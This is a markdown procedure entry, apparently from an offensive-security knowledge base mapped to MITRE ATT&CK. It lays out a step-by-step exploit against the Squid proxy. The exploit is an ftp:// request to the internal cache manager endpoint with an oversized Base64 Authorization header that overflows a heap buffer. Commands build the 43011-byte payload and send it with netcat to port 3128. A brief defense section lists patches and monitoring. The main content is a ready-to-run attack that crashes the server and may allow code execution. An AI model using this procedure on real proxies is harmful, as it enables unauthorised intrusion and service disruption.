---
id: proc-uuid-1
tags:
  - heap-overflow
  - squid
  - rce
  - ftp-bypass
type: procedure
tools:
  - '[[tools/netcat]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/send-exploit-with-netcat]]'
  - '[[commands/hostname]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:31:19.231Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Send-Crafted-HTTP-Request-to-Trigger-Heap-Overflow

## Summary

This procedure sends a specially crafted HTTP GET request to Squid's internal cache manager endpoint (/squid-internal-mgr/menu) using FTP protocol, bypassing Manager regex checks and triggering a heap overflow in the HttpHeader::getAuth function during Base64 decoding of a oversized Authorization header.

## Description

The vulnerability arises because the fixed-size buffer decodedAuthToken[8192] is used without validating the decoded length. By crafting a request with a long Base64 string that decodes to 43011 bytes, the overflow corrupts adjacent heap objects, potentially enabling remote code execution. The FTP protocol in the URL (e.g., ftp://hostname:3128/...) evades authentication requirements, allowing unauthenticated access to the internal endpoint. This is executed on a Linux environment with network access to the Squid proxy on port 3128.

## Requirements

1. Network access to Squid server on port 3128
2. File containing the exploit request (long_auth.txt) with oversized Base64 Authorization header
3. Target hostname resolved via [[commands/hostname]]
4. Netcat installed for sending the request

## Defense

Defensive measures and detection strategies:

- Enable strict ACLs on cache manager endpoints to block FTP protocol usage
- Update Squid to patched versions (post-CVE-2019-12523 or similar)
- Monitor for oversized Authorization headers in proxy logs
- Use ASAN or similar in production builds for early detection

## Objectives

1. Bypass authentication to access internal cache manager
2. Trigger heap buffer overflow via Base64 decoding
3. Corrupt heap structures for potential RCE

## Instructions

### Step 1: Retrieve Target Hostname

**Context**: Obtain the system's hostname to construct the FTP URL that bypasses protocol checks.

**Command** ([[commands/hostname]]):
```bash
hostname
```

> Retrieves the hostname (e.g., 'g64') for use in the request URL like ftp://g64:3128/.... Expected output: hostname string.

### Step 2: Prepare Exploit File

**Context**: Create long_auth.txt with the crafted request: GET ftp://<hostname>:3128/squid-internal-mgr/menu HTTP/1.1 followed by a long Authorization: Basic <base64_of_43011_bytes>.

**Command** (Manual file creation):
```bash
# Example content for long_auth.txt
GET ftp://$(hostname):3128/squid-internal-mgr/menu HTTP/1.1
Host: $(hostname):3128
Authorization: Basic $(python3 -c 'import base64; print(base64.b64encode(b"A"*43011).decode())')

```

> Generates a file with oversized Base64 that decodes beyond 8192 bytes. Expected output: File ready for transmission.

### Step 3: Send the Exploit Request

**Context**: Transmit the crafted request to Squid, triggering the overflow in HttpHeader::getAuth.

**Command** ([[commands/send-exploit-with-netcat]]):
```bash
cat long_auth.txt | nc <server> 3128
```

> Sends the request via netcat; <server> is Squid IP/hostname, 3128 is the port. Expected output: Connection close or HTTP response; Squid crashes if vulnerable.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/hostname]]
- [[commands/send-exploit-with-netcat]]

## Tools Used

- [[tools/netcat]]

## Tags

- heap-overflow
- squid
- rce
- ftp-bypass
